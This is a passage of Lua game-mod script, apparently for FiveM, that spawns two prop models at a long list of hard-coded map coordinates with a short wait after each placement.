        CreateObject(2967811882, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
